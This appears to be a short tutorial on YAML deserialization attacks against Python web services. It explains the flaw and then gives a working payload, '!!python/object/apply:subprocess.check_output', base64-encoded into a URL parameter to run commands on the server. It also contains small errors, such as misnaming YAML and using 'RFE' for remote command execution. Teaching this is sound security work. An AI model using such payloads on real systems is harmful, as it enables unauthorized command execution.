A *Deserialization Yaml Attack (DES-Yaml)* is a type of vulnerability that can occur in *Python* applications that use *YAML* (*Yet Another Markup Language*) to serialize and deserialize objects.

The vulnerability occurs when an attacker is able to control the YAML input that is passed to a deserialization function in the application. If the application code does not properly validate the YAML input, it can allow an attacker to inject malicious code into the deserialized object.

Once the object has been deserialized, the malicious code can be executed in the context of the application, which may allow the attacker to take control of the system, access sensitive data, or even execute remote code.

Attackers can exploit DES-Yaml vulnerabilities to perform denial-of-service (DoS) attacks, inject malicious code, or even take complete control of the system.

The impact of a Yaml Deserialization Attack depends on the type and sensitivity of the data that can be obtained, but can be very serious. Therefore, it is important for Python application developers to properly validate and filter the YAML input that is passed to deserialization functions, and to use security techniques such as resource limiting to prevent DoS attacks and disabling automatic deserialization of untrusted objects.

# Example

Let's imagine that in a service that runs behind *Python* we see in the URL that is concatenated the following string in *base64*: *eWFtbDogVGhpcyBpcyBhbiBleGFtcGxlIQ\==*

Let's see what it contains after decoding:

```bash
echo -n "eWFtbDogVGhpcyBpcyBhbiBleGFtcGxlIQ==" | base64 -d; echo

# Result
yaml: This is an example!
```

In this type of cases where *YAML* is interpreted we can create a *data* file that includes the following:

```
yaml: !!python/object/apply:subprocess.check_output ['whoami']
```

And then convert it to *base64* keeping it all on one line:

```bash
cat data | base64 -w 0; echo
```

The result can be concatenated to the URL to perform a *Remote Command Execution (RFE)* replacing the original *base64*, applying the entered command when the *YAML* *deserializes* the data.